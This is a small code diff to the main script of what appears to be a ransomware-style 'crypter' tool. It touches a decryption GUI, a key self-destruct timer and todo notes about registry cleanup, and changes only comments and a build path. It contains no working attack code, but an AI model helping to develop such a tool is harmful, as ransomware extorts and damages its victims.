@@ -2,7 +2,7 @@
 ## Main Script
 ## author mls
 # todo Adjust dialogs to only allow one instance open at a time
-# todo delete registry key following successful decryption
+# todo Disable OK and Canel buttons on decryption AS SOON as OK is hit and decryption starts
 
 '''
 @done:
@@ -105,7 +105,7 @@ class Main(Base.Base):
     start_time = self.get_start_time()
     
     app = wx.App()
-    sys._MEIPASS = "..\\..\\build_script\\images"
+    #sys._MEIPASS = "..\\..\\build_script\\images"
     crypter_gui = Gui.MyFrame1(None, 
                                sys._MEIPASS, 
                                self.KEY_DESTRUCT_TIME_SECONDS, 
